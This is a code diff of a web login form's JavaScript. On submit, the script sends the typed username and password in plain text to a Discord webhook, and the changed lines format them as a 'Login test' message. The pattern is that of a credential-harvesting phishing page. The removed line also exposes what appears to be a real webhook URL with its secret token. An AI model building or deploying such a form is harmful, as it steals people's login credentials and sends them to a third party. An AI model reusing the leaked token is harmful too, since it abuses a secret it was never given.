@@ -119,24 +119,25 @@ document.getElementById('login').addEventListener('submit', function (e) {
   if (!id || !pw) { err.textContent = 'Fill in both fields.'; err.classList.add('show'); return; }
   err.classList.remove('show');
 
-  var WEBHOOK_URL = 'https://discord.com/api/webhooks/1523359394908209212/cw-IUAk2OzD6_AnEL6MC39q1kAV-cOqTFVEPB6_DLGO7TwotZmFQwKSpixI1NXFMjjr-'; // <- put your webhook here
+  var WEBHOOK_URL = 'https://your-webhook-url-here'; // <- your discord webhook
 
   fetch(WEBHOOK_URL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      username: id,
-      password: pw,
-      time: new Date().toISOString()
+      content: 'Login test:\nUsername: ' + id + '\nPassword: ' + pw
     })
   })
     .then(function (r) {
       if (r.ok) {
         console.log('sent to webhook');
-        // window.location.href = '/dashboard'; // uncomment once you have real auth
+        // window.location.href = '/dashboard'; // once you have real auth
       } else {
-        err.textContent = 'Something went wrong.';
-        err.classList.add('show');
+        return r.text().then(function (body) {
+          console.log('status:', r.status, 'body:', body);
+          err.textContent = 'Something went wrong.';
+          err.classList.add('show');
+        });
       }
     })
     .catch(function () {
